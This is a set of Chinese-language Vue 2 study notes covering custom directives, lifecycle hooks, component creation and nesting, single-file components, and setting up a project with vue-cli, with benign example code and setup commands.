函数方式时调用函数的时机：函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>自定义指令</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>{{name}}</h2>
			<h2>当前的n值是：<span v-text="n"></span> </h2>
			<!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
			<h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
			<button @click="n++">点我n+1</button>
			<hr/>
			<input type="text" v-fbind:value="n">
		</div>
	</body>
	
	<script type="text/javascript">
		Vue.config.productionTip = false

		//定义全局指令
		/* Vue.directive('fbind',{
			//指令与元素成功绑定时（一上来）
			bind(element,binding){
				element.value = binding.value
			},
			//指令所在元素被插入页面时
			inserted(element,binding){
				element.focus()
			},
			//指令所在的模板被重新解析时
			update(element,binding){
				element.value = binding.value
			}
		}) */

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				n:1
			},
			directives:{
				//big函数何时会被调用？1.指令与元素成功绑定时（一上来）。2.指令所在的模板被重新解析时。
				/* 'big-number'(element,binding){
					// console.log('big')
					element.innerText = binding.value * 10
				}, */
				big(element,binding){
					console.log('big',this) //注意此处的this是window
					// console.log('big')
					element.innerText = binding.value * 10
				},
				fbind:{
					//指令与元素成功绑定时（一上来）
					bind(element,binding){
						element.value = binding.value
					},
					//指令所在元素被插入页面时
					inserted(element,binding){
						element.focus()
					},
					//指令所在的模板被重新解析时
					update(element,binding){
						element.value = binding.value
					}
				}
			}
		})
		
	</script>
</html>
```



## 生命周期

### 基础

1. 又名：生命周期回调函数、生命周期函数、生命周期钩子。

2. 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数。

3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。

4. 生命周期函数中的this指向是vm 或 组件实例对象。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 v-if="a">你好啊</h2>
			<h2 :style="{opacity}">欢迎学习Vue</h2>
		</div>
	</body>
	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		 new Vue({
			el:'#root',
			data:{
				a:false,
				opacity:1
			},
			methods: {
				
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				setInterval(() => {
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
		})

		//通过外部的定时器实现（不推荐）
		/* setInterval(() => {
			vm.opacity -= 0.01
			if(vm.opacity <= 0) vm.opacity = 1
		},16) */
	</script>
</html>
```



### 生命周期钩子

> 所有生命周期钩子的 `this` 上下文将自动绑定至实例中，因此你可以访问 data、computed 和 methods。这意味着**你不应该使用箭头函数来定义一个生命周期方法** (例如 `created: () => this.fetchTodos()`)。因为箭头函数绑定了父级上下文，所以 `this` 不会指向预期的组件实例，并且`this.fetchTodos` 将会是 undefined。

<a href='https://v2.cn.vuejs.org/v2/api/?#%E9%80%89%E9%A1%B9-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E9%92%A9%E5%AD%90'>生命周期钩子函数</a>

每个 Vue 实例在被创建时都要经过一系列的初始化过程——例如，需要设置数据监听、编译模板、将实例挂载到 DOM 并在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做**生命周期钩子**的函数，这给了用户在不同阶段添加自己的代码的机会。

比如 [`created`](https://v2.cn.vuejs.org/v2/api/#created) 钩子可以用来在一个实例被创建之后执行代码：

```js
new Vue({
  data: {
    a: 1
  },
  created: function () {
    // `this` 指向 vm 实例
    console.log('a is: ' + this.a)
  }
})
// => "a is: 1"
```

也有一些其它的钩子，在实例生命周期的不同阶段被调用，如 [`mounted`](https://v2.cn.vuejs.org/v2/api/#mounted)、[`updated`](https://v2.cn.vuejs.org/v2/api/#updated) 和 [`destroyed`](https://v2.cn.vuejs.org/v2/api/#destroyed)。生命周期钩子的 `this` 上下文指向调用它的 Vue 实例。

> 不要在选项 property 或回调上使用[箭头函数](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/Arrow_functions)，比如 `created: () => console.log(this.a)` 或 `vm.$watch('a', newValue => this.myMethod())`。因为箭头函数并没有 `this`，`this` 会作为变量一直向上级词法作用域查找，直至找到为止，经常导致 `Uncaught TypeError: Cannot read property of undefined` 或 `Uncaught TypeError: this.myMethod is not a function` 之类的错误。



### 生命周期图示

==<a href='https://v2.cn.vuejs.org/v2/guide/instance.html#%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%9B%BE%E7%A4%BA'>官网生命周期图示</a>==

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302081127366.png"  />

解读：

1. Init：初始化，数据代理还未开始，即此时 vm 还未收到 data 中的数据才，此时还没有 vm._data

2. 程序中使用 debugger; 打断点

3. outerHTML：指的是将整个div作为 vue 模板进行解析，如果是 innerHTML 则指的是 div 内部的结构作为 vue 模板，Compile 编译；template 模板

	<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302081138933.png" alt="image-20230208113839845" style="zoom: 50%;" />

4. beforeMount：此时对所有 DOM 的操作最终都是不奏效的，因为后面的 create 阶段会将使用虚拟 DOM 将真实 DOM 覆盖掉。但是可以做其他的操作。

5. 使用 template 配置项配置 vue 模板时，会存在问题：配置项中的内容就会完全覆盖 上文的模板，即：页面中只会存在 template 配置项中的内容，而不会出现 #root 元素内容（覆盖）；只能在该配置项中有一个根元素，即下图中的最外层的 div，否则会报错。

	<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302081155674.png" alt="image-20230208115505565" style="zoom: 50%;" />

6. mounted 钩子函数及以上内容均属于 vue 生命周期的挂载流程。中间红色圈 mounted 是更新流程，最后是数据销毁流程。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>分析生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root" :x="n">
			<h2 v-text="n"></h2>
			<h2>当前的n值是：{{n}}</h2>
			<button @click="add">点我n+1</button>
			<button @click="bye">点我销毁vm</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			// template:`
			// 	<div>
			// 		<h2>当前的n值是：{{n}}</h2>
			// 		<button @click="add">点我n+1</button>
			// 	</div>
			// `,
			data:{
				n:1
			},
			methods: {
				add(){
					console.log('add')
					this.n++
				},
				bye(){
					console.log('bye')
					this.$destroy()
				}
			},
			watch:{
				n(){
					console.log('n变了')
				}
			},
			beforeCreate() {
				console.log('beforeCreate')
			},
			created() {
				console.log('created')
			},
			beforeMount() {
				console.log('beforeMount')
			},
			mounted() {
				console.log('mounted')
			},
			beforeUpdate() {
				console.log('beforeUpdate')
			},
			updated() {
				console.log('updated')
			},
			beforeDestroy() {
				console.log('beforeDestroy')
			},
			destroyed() {
				console.log('destroyed')
			},
		})
	</script>
</html>
```



### 总结

常用的生命周期钩子：

1. mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。

2. beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。



关于销毁Vue实例

1. 销毁后借助Vue开发者工具看不到任何信息。

2. 销毁后自定义事件会失效，但原生DOM事件依然有效。

3. 一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>引出生命周期</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2 :style="{opacity}">欢迎学习Vue</h2>
			<button @click="opacity = 1">透明度设置为1</button>
			<button @click="stop">点我停止变换</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		 new Vue({
			el:'#root',
			data:{
				opacity:1
			},
			methods: {
				stop(){
					this.$destroy()
				}
			},
			//Vue完成模板的解析并把初始的真实DOM元素放入页面后（挂载完毕）调用mounted
			mounted(){
				console.log('mounted',this)
				this.timer = setInterval(() => {
					console.log('setInterval')
					this.opacity -= 0.01
					if(this.opacity <= 0) this.opacity = 1
				},16)
			},
			beforeDestroy() {
				clearInterval(this.timer)
				console.log('vm即将驾鹤西游了')
			},
		})

	</script>
</html>
```



## vue 组件

### 为什么推荐使用组件？

在传统的编写方式中：文件的复用率较低，混乱，不好维护，代码重复率较高。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302082121636.png" alt="image-20230208212157418" style="zoom:50%;" />

而在使用组件方式编写应用后，复用性更高，封装后更结构清晰。

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302082314030.png" alt="image-20230208231448783" style="zoom:50%;" />

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302082318209.png" alt="image-20230208231858053" style="zoom: 50%;" />



### 组件形式

- 非单文件组件：一个文件中包含有 n 个组件。
- 单文件组件：一个文件中只包含有 1 个组件，文件名是 xxx.vue。



### 非单文件组件的基本使用

- 非单文件组件

	分为三步：创建组件（定义组件）、注册组件、使用组件（写组件标签）

	细节：
	
	1. 创建组件时可能会用大写如 ：Student，但是使用标签的时候可以用小写\<student>\</student>
	2. 组件之间的数据是相互不影响的，如一个组件连续使用了多次，但是每一次的组件的数据都是独立的，每个组件都会各自独立维护它的 `count`。因为你每用一次组件，就会有一个它的新**实例**被创建。



#### 总结

​      一、如何定义一个组件？

​            使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；

​            区别如下：

​                1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。

​                2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。**一个组件的 `data` 选项必须是一个函数**，因此每个实例可以维护一份被返回对象的独立的拷贝。

​            备注：使用template可以配置组件结构。

​      二、如何注册组件？

​              1.局部注册：靠new Vue的时候传入components选项

​              2.全局注册：靠Vue.component('组件名',组件)

​      三、编写组件标签：

​              \<school>\</school>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>基本使用</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<hello></hello>
			<hr>
			<h1>{{msg}}</h1>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<school></school>
			<hr>
			<!-- 第三步：编写组件标签 -->
			<student></student>
		</div>

		<div id="root2">
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		//第一步：创建school组件
		const school = Vue.extend({
			template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
				</div>
			`,
			// el:'#root', //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。
			data(){
				return {
					schoolName:'尚硅谷',
					address:'北京昌平'
				}
			},
			methods: {
				showName(){
					alert(this.schoolName)
				}
			},
		})

		//第一步：创建student组件
		const student = Vue.extend({
			template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
				</div>
			`,
			data(){
				return {
					studentName:'张三',
					age:18
				}
			}
		})
		
		//第一步：创建hello组件
		const hello = Vue.extend({
			template:`
				<div>	
					<h2>你好啊！{{name}}</h2>
				</div>
			`,
			data(){
				return {
					name:'Tom'
				}
			}
		})
		
		//第二步：全局注册组件
		Vue.component('hello',hello)

		//创建vm
		new Vue({
			el:'#root',
			data:{
				msg:'你好啊！'
			},
			//第二步：注册组件（局部注册）
			components:{
				school,
				student
			}
		})

		new Vue({
			el:'#root2',
		})
	</script>
</html>
```



#### 几个注意点

​          1.关于组件名:

​                一个单词组成：

​                      第一种写法(首字母小写)：school

​                      第二种写法(首字母大写)：School

​                多个单词组成：

​                      第一种写法(kebab-case命名)：my-school

​                      第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)

​                备注：

​                    (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。

​                    (2).可以使用name配置项指定组件在开发者工具中呈现的名字。



​          2.关于组件标签:

​                第一种写法：\<school>\</school>

​                第二种写法：\<school/>

​                备注：不用使用脚手架时，\<school/>会导致后续组件不能渲染。



​          3.一个简写方式：

​                const school = Vue.extend(options) 可简写为：const school = options

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>几个注意点</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>{{msg}}</h1>
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义组件
		const s = Vue.extend({
			name:'atguigu',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			}
		})

		new Vue({
			el:'#root',
			data:{
				msg:'欢迎学习Vue!'
			},
			components:{
				school:s
			}
		})
	</script>
</html>
```



#### 组件嵌套

生产常用 app 用于管理所有的组件

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>组件的嵌套</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//定义student组件
		const student = Vue.extend({
			name:'student',
			template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					age:18
				}
			}
		})
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			//注册组件（局部）
			components:{
				student
			}
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`<h1>{{msg}}</h1>`,
			data(){
				return {
					msg:'欢迎来到尚硅谷学习！'
				}
			}
		})
		
		//定义app组件
		const app = Vue.extend({
			template:`
				<div>	
					<hello></hello>
					<school></school>
				</div>
			`,
			components:{
				school,
				hello
			}
		})

		//创建vm
		new Vue({
			template:'<app></app>',
			el:'#root',
			//注册组件（局部）
			components:{app}
		})
	</script>
</html>
```



#### VueComponent构造函数

1. school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

2. 我们只需要写\<school/>或\<school>\</school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的

	：new VueComponent(options)。

3. 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！

4. 关于this指向：

	1. 组件配置中：

		   data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。

	2. new Vue(options)配置中：

		   data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

5. VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。Vue的实例对象，以后简称vm.

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>VueComponent</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<school></school>
			<hello></hello>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showName">点我提示学校名</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showName(){
					console.log('showName',this)
				}
			},
		})

		const test = Vue.extend({
			template:`<span>atguigu</span>`
		})

		//定义hello组件
		const hello = Vue.extend({
			template:`
				<div>
					<h2>{{msg}}</h2>
					<test></test>	
				</div>
			`,
			data(){
				return {
					msg:'你好啊！'
				}
			},
			components:{test}
		})

		// console.log('@',school)
		// console.log('#',hello)

		//创建vm
		const vm = new Vue({
			el:'#root',
			components:{school,hello}
		})
	</script>
</html>
```



#### 一些内置关系（Vue—Vuecomponent）

实例的隐式原型属性（\__proto__）永远指向自己缔造者的原型对象（prototype）

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302092341414.png" alt="image-20230209234130149" style="zoom:50%;" />



1. 一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
2. 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>一个重要的内置关系</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<school></school>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		Vue.prototype.x = 99

		//定义school组件
		const school = Vue.extend({
			name:'school',
			template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showX">点我输出x</button>
				</div>
			`,
			data(){
				return {
					name:'尚硅谷',
					address:'北京'
				}
			},
			methods: {
				showX(){
					console.log(this.x)
				}
			},
		})

		//创建一个vm
		const vm = new Vue({
			el:'#root',
			data:{
				msg:'你好'
			},
			components:{school}
		})
		
		//定义一个构造函数
		/* function Demo(){
			this.a = 1
			this.b = 2
		}
		//创建一个Demo的实例对象
		const d = new Demo()

		console.log(Demo.prototype) //显示原型属性

		console.log(d.__proto__) //隐式原型属性

		console.log(Demo.prototype === d.__proto__)

		//程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
		Demo.prototype.x = 99

		console.log('@',d) */

	</script>
</html>
```



#### 非单文件的一些缺点

1. 模板编写没有提示

2. 没有构建过程, 无法将 ES6 转换成 ES5

3. 不支持组件的 CSS

4. 真正开发中几乎不用





### 单文件组件

xxx.vue 文件需要经过处理变为 JS 文件才能被浏览器识别，常用的有：vue脚手架、webpack等

#### 一个 .vue 文件的组成

- 模板页面
- JS 模块对象
- 样式

```vue
<template>
    <!-- 页面结构 -->
    <div></div>
</template>

<script>
// 页面效果 JS
export default {

}
</script>

<style>
    /* 页面样式 */
</style>
```



#### 基本使用

1. 引入组件

2. 映射成标签

3. 使用组件标签



组件代码School.vue：

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

组件代码Student.vue：

```vue
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

组件代码App.vue，集合所有的零散组件：

```vue
<template>
	<div>
		<!-- 自闭合标签在脚手架中是可以使用的 -->
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

入口文件 main.js：

```js
import App from './App.vue'

new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

展示页面 index.html：

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
		<!-- <script type="text/javascript" src="../js/vue.js"></script> -->
		<!-- <script type="text/javascript" src="./main.js"></script> -->
	</body>
</html>
```



==后续的使用（xxx.vue 文件的编译和运行需要脚手架环境的支持）！==



#  使用 vue 脚手架—vue-cli

（脚手架）

全称：command line interface，命令行接口工具



## 初始化脚手架

### 说明

1. Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。

2. 最新的版本是 4.x。

3. 文档: https://cli.vuejs.org/zh/



### 具体步骤

第一步（仅第一次执行）：全局安装@vue/cli，安装之后会在全局命令行中出现一个可用命令 vue 

`npm install -g @vue/cli`

安装过程中可能报一些警告，无伤大雅！！！

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302101740063.png" alt="image-20230210174004935" style="zoom: 50%;" />



第二步：**切换到你要创建项目的目录**，然后使用命令创建项目

`vue create xxxx`

创建项目

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302101756862.png" alt="image-20230210175605761" style="zoom: 67%;" />

选择使用的 vue 版本

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302101754919.png" alt="image-20230210175454827" style="zoom: 67%;" />

选择默认的包管理器

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302101757916.png" alt="image-20230210175709829" style="zoom: 67%;" />

回车之后等待安装配置，配置完成后可以发现出现了一个文件夹

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302101759465.png" alt="image-20230210175945345" style="zoom: 50%;" />

可以发现里面有一些配置好的文件

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302101800923.png" alt="image-20230210180037833" style="zoom: 67%;" />



第三步：启动项目（==需要先切换目录进入到项目中才可以，否则会报错==）

`npm run serve`

启动完后的结果（其实是翻译 vue 文件的过程，因为在创建项目的时候会默认编写一个 helloworld 文件，翻译的是这个，然后会创建一个服务器，自己可以通过两个任意一个访问，同局域网下的人可以通过第二个网址访问）

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302101805837.png" alt="image-20230210180528753" style="zoom:67%;" />

访问结果：

<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302101808670.png" alt="image-20230210180834470" style="zoom: 50%;" />



备注：

1. 如出现下载缓慢请配置 npm 淘宝镜像：`npm config set registry https://registry.npm.taobao.org`

2. Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置，请执行：`vue inspect > output.js`



### 模板项目的结构

```
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```

- package.json

	- 这三个命令都是 webpack 的短命令

	- serve：是执行“npm run serve” 后真正执行的命令

	- build：是所有的项目功能实现完成后通过 build 命令将 xx.vue 文件转化为浏览器能识别的 html/css/js 文件

	- lint：进行语法检查的命令，几乎不用（插件代替或是在最后某个时间点集中检查）

		<img src="https://gitee.com/chenfenghx/typora-images/raw/master/%E5%B0%9A%E7%A1%85%E8%B0%B7Vue2.0+Vue3.0%E5%85%A8%E5%A5%97%E6%95%99%E7%A8%8B%E4%B8%A8vuejs%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/202302102259618.png" alt="image-20230210225935516" style="zoom:67%;" />

- package-lock.json

	- 包版本控制文件，将使用到的包的版本锁死，指定版本下载

- main.js

	- 执行命令“npm run serve” 后首先进入的就是该文件

main.js

```js
/* 
	该文件是整个项目的入口文件
*/
//引入Vue
import Vue from 'vue'
//引入App组件，它是所有组件的父组件
import App from './App.vue'
//关闭vue的生产提示
Vue.config.productionTip = false

//创建Vue实例对象---vm
new Vue({
	el:'#app',
	//render函数完成了这个功能：将App组件放入容器中
  render: h => h(App),
	// render:q=> q('h1','你好啊')

	// template:`<h1>你好啊</h1>`,
	// components:{App},
})
```

index.html

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 针对IE浏览器的一个特殊配置，含义是让 IE 浏览器以最高的渲染级别渲染页面 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页签图标，避免在放入服务器后导致的路径问题，尖括号里的内容代表 public 路径 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 配置网页标题，学习webpack，代表在 package.json中去找 name中的内容，由插件自动完成 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <!-- 当浏览器不支持js 时 noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>

```



### render函数

关于不同版本的Vue：
	1. vue.js与vue.runtime.xxx.js的区别：
			(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。
			(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。

2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用 render函数接收到的createElement函数去指定具体内容。	
